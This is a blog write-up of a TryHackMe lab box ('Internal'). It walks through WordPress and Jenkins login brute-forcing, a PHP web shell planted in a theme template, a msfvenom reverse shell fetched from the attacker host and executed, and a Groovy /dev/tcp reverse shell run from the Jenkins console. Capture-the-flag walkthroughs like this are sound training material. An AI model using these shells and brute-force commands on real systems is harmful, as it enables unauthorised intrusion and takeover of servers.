+++
title = 'Internal Write Up'
date = 2024-02-14T08:50:55+02:00
draft = false
tags = ["tryhackme", "security", "pentest", "oscp"]
+++

Box: Internal\
Platform: Try Hack Me\
Grade: Hard

## Service Enumeration

````
sudo nmap -sC -sV 10.10.52.194

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.57 seconds
````

### SSH

OpenSSH 7.6p1. 

### Web

Apache httpd 2.4.29.

Only default page is shown. The logical next step is to try to find the directory structure of the server.

```
gobuster dir -u http://10.10.52.194 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 --no-error

http://10.10.52.194/phpmyadmin/index.php
http://10.10.52.194/blog
http://10.10.52.194/wordpress
```

It seems the site is running Worpress. Trying to log to phpmyadmin with default credentials doesn't work. Browsing to /wordpress shows that the page tries to reach out to its own domain name internal.thm. Adding that to /etc/hosts.

### Wordpress

Running WPScan to reveal potential vulnerabilities.

````
sudo wpscan -e ap -t 500 --url http://internal.thm/blog
````

WordPress 5.4.2 and no plugins installed. Which is a bummer because plugins are a great point of entry. 

Trying the WP admin panel at http://internal.thm/blog/wp-login.php to enumerate valid usernames. Admin is a valid user according to error message.

At this point I couldn't find an obvious vulnerability for WP so I resorted to trying to brute force the admin login. I'm not a fan of brute forcing anything so this should be used as a last resort if nothing else offers an opportunity. 

````
sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://internal.thm/wordpress
````

Much to my surprise brute force attempt was succesful and I found the admin password. The next step is easy. Let's attempt to exploit WP Themes Editor. 

## Initial Access

So logged in as admin browsing to Theme Editor.
Edit Twenty Seventeen: 404 Template

```
# Adding a simple web shell after the initial comments.
system($_GET[cmd]);

# Testing the shell
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

````
# Enumerating OS users
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=cat+/etc/passwd

aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
````

So it seems that the system has one standard user and one service account user which suggest MySQL runs on the box. 

Webshell works but the next step is to upgrade the shell. 

## Shell Upgrade

````
# Create shell and listener
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.67.91 LPORT=4444 -f elf > shell.elf
rlwrap nc -nvlp 4444

# Enable Python web server
python -m http.server 8000

# Execute the shell
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=curl+http://10.11.67.91:8000/shell.elf+-o+/tmp/shell.elf 
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=chmod+700+/tmp/shell.elf   
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=/tmp/shell.elf 

# Upgrade to interactive
python -c 'import pty; pty.spawn("/bin/bash")'
````

## Operating System Enumeration

The config file wp-config.php reveals a hardcoded MySQL username and password.

```
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'

<ss$ cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
define( 'DB_USER', 'wordpress' );
```

## MySQL Enumeration

````
show databases;
use wordpress;
show tables;
select * from wp_users;
````

Only admin user was found. It doesn't give anything new as I already have WP admin account. 

## Privilege Escalation

Manual enumeration was a dead end at this point so running LinPEAS seemed like a good idea to check whether I had missed something. 

````
# Get the code
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Move to target, set permissions and run.
./linpeas.sh

# Found another user and a password.
phpmyadmin
````

## phpMyAdmin Enumeration

phpMyAdmin is a web-based MySQL db management tool based on PHP and hosted on a web server.

5.7.31

This version seems to suffer from CVE-2016-6663. 

Exploit code is availabe: https://www.exploit-db.com/exploits/40678

To be able to escalate privileges I need mysql user account. I could try to upload a rshell using phpMyAdmin.

## Linux Password Hunt

I started to have a feeling that I was making this more complicated than needed so I went back to basics.

````
# Looking for file content related to known user accounts
grep -r -l 'aubreanna' / 2>/dev/null

# Interesting file that seems to include password for aubreanna
/opt/wp-save.txt
````

## Lateral Movement

````
# SSH in
ssh -l aubreanna internal.thm
````

User flag in /home/aubreanna. Also home folder contains a message that Jenkins is running on 
172.17.0.2:8080. This should be cool because it has a live console. Running ip a tells that the Jenkins instance is running as a Docker container. 

## Pivoting to Jenkins

````
ssh -L 1234:172.17.0.2:8080 aubreanna@internal.thm
````

Jenkins can be accessed now with attack box's browser: localhost:1234

Default credentials (admin:password) doesn't work. Also because it runs as a Docker container and aubreanna doesn't have rights to manage Docker I can't do much. The last resort remain: Let's try brute force login.

First intercept the login attempt, send to Burp and save it to a file.

````
# Request
POST /j_acegi_security_check HTTP/1.1
Host: localhost:1234
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://localhost:1234
Connection: close
Referer: http://localhost:1234/loginError
Cookie: JSESSIONID.6c9a373a=node02dnek68vlg0llcj0gww2jm60.node0; JSESSIONID.bbc44c3d=node0ffzdsnmx4z1611tao9l27umlj0.node0
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

j_username=admin&j_password=PASS&from=&Submit=Sign+in

# Launching the attack with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 1234 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
````

Hydra was able to find the password for admin. 

## Jenkins Exploit

Let's head over to script console at http://localhost:1234/script.

````
# Webshell
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
````

Webshell is great but reverse shell is better. Let's install one.

````
# Attack box
rlwrap nc -nvlp 4444 

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.11.67.91/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
````

As Jenkins is running as a Docker container the next step would be break out from the container to the host system.

## Jenkins Enumeration

There is an interesting file in /opt called note.txt that reveals something very disturbing. So no need for Docker breakout. 

## Root Access

With the information SSH in as root and get the root flag.


## After Action Review
- Jenkins was easy to brute force with Hydra but same attack didn't work with ffuf. I don't know why. Annoying.
- Don't neglect looking for files that reveal important information. 
- Doing a write up while testing was excellent for processing thoughts and making progress in a logical manner. 
- This was a fun box!